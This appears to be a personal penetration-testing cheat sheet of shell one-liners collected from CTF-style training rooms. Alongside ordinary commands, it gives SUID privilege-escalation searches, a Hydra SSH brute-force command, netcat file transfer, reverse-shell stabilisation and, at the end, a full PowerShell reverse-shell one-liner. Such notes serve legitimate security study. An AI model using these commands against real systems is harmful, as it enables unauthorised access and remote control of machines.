# Quick-and-Dirty-Bash-Scripting
I decided to start collecting all the quick and dirty bash scripts I have created / found on the web during Security Research

# General Syntax / Useful Commands
	• Available shells on the system look in 
	
	/etc/shells    

	• [important files] Users are located in 
	
	/etc/passwd
	
	• [less] System wide crontab
	
	Less /etc/crontab

	• Download all files from ftp Anonymous Login
	wget -m ftp://anonymous:anonymous@<ipaddress>
	
	• [CURL]
	[spoof username and follow all redirects] curl -A "username" -L 10.10.38.4
	
	• [FIND]
	
	[files and directories with user perms] find / -perm -u=s -type f 2>/dev/null
	
	[find all suid files] Find . -perm /4000 or find -perm /4000
	
	[find all files for a specific user ] find / -user <user>
	
	[Find all the SUID/SGID executables] find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
	
	From <https://tryhackme.com/room/linuxprivesc> 
	
	
	
	find - Initiates the "find" command
	
	/ - Searches the whole file system
	
	-perm - searches for files with specific permissions
	
	-u=s - Any of the permission bits mode are set for the file. Symbolic modes are accepted in this form
	
	-type f - Only search for files
	
	2>/dev/null - Suppresses errors
	
	find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
	
	
	• [host http server] Setting up a simple web server in python3
	
	Python3  -m http.server 8000	Or whatever port you prefer 
	Python2 python -m SimpleHTTPServer 8000	

	• Download files from host with Netcat

	Receive on user machine -  nc -l -p 1234 > *file to receive*
	Send from host machine -   nc -w 3 10.2.8.75 1234 < *file to send*
	
	• [openssl] Creating a hash / compliant password hash
	
	 openssl passwd -1 -salt [salt] [password]
	
	• Convert HEX into ascii
	
	echo <hex value> | xxd -r -p
	
	
	• [Hydra] attack on for ssh on smtp server

	hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt 10.10.164.218 ssh -vV
	
	• Secure Copy Protocol 

	scp [filename] [username]@[IP of remote machine ]:/[directory to upload to]

	• SHA1 hash of a file

	sha1sum file8 | awk '{print $1}'
	
	• Find nmap scripts
	
	find /usr/share/nmap/scripts -type f 2>/dev/null | grep (whatever it is you are looking for)
	
	• Stabilize reverse netcat shell with python

	Python3 -c 'import pty;pty.spawn("/bin/bash")'
	
	export TERM=xterm then background shell with Ctrl + Z then in our own terminal we use 
	
	stty raw -echo; fg 
	does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
	

	
	
	From <https://tryhackme.com/room/linuxstrengthtraining> 
	
	
	• Kibana-log
cat kibana-log.txt | grep -e http://0.0.0.0:[0-9][0-9][0-9][0-9] -o | sort -u
http://0.0.0.0:5601
http://0.0.0.0:9200

	• Windows Reverse shell
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

![image](https://github.com/user-attachments/assets/684e7a37-8646-4c7f-97a8-a70920166e85)
